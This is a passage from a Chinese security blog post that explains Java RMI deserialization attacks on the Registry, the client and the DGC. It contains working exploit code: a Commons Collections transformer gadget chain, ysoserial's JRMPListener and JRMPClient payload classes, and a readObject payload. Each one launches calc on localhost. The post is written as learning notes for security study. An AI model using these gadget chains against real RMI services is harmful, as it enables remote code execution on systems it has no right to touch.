class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 连接 Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//使用 AnnotationInvocationHandler 动态代理 Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//使用 AnnotationInvocationHandler 动态代理 Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind 到 Registry 时会触发反序列化</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 初始化 Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// 创建 ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要 Registry 端具有相应的依赖及相应 JDK 版本需求。</p><p>这个攻击手段实际上就是 ysoserial 中的 <strong>ysoserial.exploit.RMIRegistryExploit</strong> 的实现原理。</p><p>除了 bind，由于 lookup&#x2F;rebind 等方法均通过反序列化传递数据，因此此处的实际攻击手段不止 bind 一种。也就是说，名义上的 Server 端和 Client 端都可以攻击 Registry 端。</p><h3 id="Client-端-Attack"><a href="#Client-端-Attack" class="headerlink" title="Client 端 Attack"></a>Client 端 Attack</h3><p>如果攻击的目标作为 Client 端，也就是在 Registry 地址可控，或 Registry&#x2F;Server 端可控，也是可以导致攻击的。客户端主要有两个交互行为，第一是从 Registry 端获取调用服务的 stub 并反序列化，第二步是调用服务后获取执行结果并反序列化。</p><p>这部分攻击实战意义较少，并且与上述讨论的攻击 Server 端和 Registry 端的攻击都是镜像行为，所以这里简单描述一下流程就不再演示了。</p><p>客户端的攻击和上面的都类似，大概就下面几个攻击点</p><ul><li>恶意Server返回方法调用结果</li><li>恶意Server(Registry)返回Stub</li><li>动态类加载（Server返回的调用结果若为客户端不存在的类，客户端也支持动态加载）</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGC（Distributed Garbage Collection）</strong>—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。</p><p>RMI 定义了一个 <code>java.rmi.dgc.DGC</code> 接口，提供了两个方法 <code>dirty</code> 和 <code>clean</code>：</p><ul><li>客户端想要使用服务端上的远程引用，使用 <code>dirty</code> 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li><li>客户端不使用的时候，需要调用 <code>clean</code> 方法来清楚这个远程引用。</li></ul><p>这个接口有两个实现类，分别是 <code>sun.rmi.transport.DGCImpl</code> 以及 <code>sun.rmi.transport.DGCImpl_Stub</code>，同时还定义了 <code>sun.rmi.transport.DGCImpl_Skel</code>。</p><p>这个命名方式看着确实非常眼熟。</p><p>没错，很像 Registry、RegistryImpl、RegistryImpl_Stub、RegistryImpl_Skel，实际上不单是命名相近，处理逻辑也是类似的。通过在服务端和客户端之间传递引用，依旧是 Stub 与 Skel 之间的通信模式：Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理。</p><p>攻击手段就是</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>见ysoserial的<code>exploit.JRMPListener</code>和<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击的gadget分 UnicastRemoteObject、UnicastRef和RemoteObject三种。这里不做过多解释。</p><p>总结为</p><ul><li>exploit<ul><li>JRMPListner：构造恶意JRMP服务器，返回异常让客户端反序列化 <code>StreamRemoteCall#executeCall</code></li><li>JRMPClient：发送恶意序列化数据，打DGC服务 <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListner：<code>UnicastRemoteObject</code>反序列化时会导出对象，触发JRMP监听端口，配合exploit.JRMPClient打</li><li>JRMPClient：<code>UnicastRef</code>反序列化时会触发DGC的<code>ditry</code>，配合exploit.JRMPListner打</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>最后浅浅打一个简单使用RMI服务调用远程对象反序列化弹calc作为我最后的结束吧，JEP 290的bypass放在后面文章再进行复现。JNDI也同样会放在后面再详细复盘。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>);<br>        <span class="hljs-type">RMITest</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> (RMITest) registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RMITest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMITestImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RMITest</span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RMITestImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testcalc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayObject</span><span class="hljs-params">(Object obj)</span> &#123;<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/7.png" alt="7"></p><p>抄了下<a href="https://blog.csdn.net/uuzeray/article/details/135886709?ops_request_misc=%7B%22request_id%22:%22172199251516800186550713%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=172199251516800186550713&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-135886709-null-null.nonecase&utm_term=RMI&spm=1018.2226.3001.4450">【心得】java JNDI配合RMI实现注入个人笔记_${jndi:rmi:-CSDN博客</a>（我是懒狗）</p><p>原理很简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、定义远程接口 (RMITest.java):  <br>· 定义了一个远程接口 RMITest，其中包含两个方法 testcalc() 和 sayObject(Object obj)。<br>这些方法声明抛出 RemoteException，以便在远程调用时处理可能的网络问题。<br><br><span class="hljs-number">2</span>、实现远程接口 (RMITestImpl.java):  <br>· RMITestImpl 类实现了 RMITest 接口，并继承了 UnicastRemoteObject，使其成为一个远程对象。<br>· 在 testcalc() 方法中，使用 Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) 来执行系统命令，弹出计算器。<br>· sayObject(Object obj) 方法简单地打印传入的对象。<br><br><span class="hljs-number">3</span>、创建并启动RMI服务器 (RMIServer.java):  <br>· 在 main 方法中，创建 RMITestImpl 的实例。<br>· 使用 LocateRegistry.createRegistry(<span class="hljs-number">8081</span>) 创建一个在端口 <span class="hljs-number">8081</span> 上监听的 RMI 注册表。<br>· 将 RMITestImpl 实例绑定到注册表中，名称为 <span class="hljs-string">&quot;EddieMurphy&quot;</span>。<br>· 打印一条消息表示服务器正在监听。<br><br><span class="hljs-number">4</span>、创建并启动RMI客户端 (RMIClient.java):  <br>· 在 main 方法中，使用 LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">8081</span>) 获取服务器的注册表。<br>· 使用 registry.lookup(<span class="hljs-string">&quot;EddieMurphy&quot;</span>) 查找远程对象，并将其强制转换为 RMITest 接口。<br>· 调用 rmiTest.sayObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">payload</span>()) 方法，传递一个 payload 对象。<br>· 调用 rmiTest.testcalc() 方法，执行远程方法，弹出计算器。<br></code></pre></td></tr></table></figure><p>后续的JNDI是重头戏，lookup是典型的特征。那么JNDI结合RMI打法就先留待抛砖引玉吧。</p><p>参考：</p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/rmi">RMI | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深 | 素十八 (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
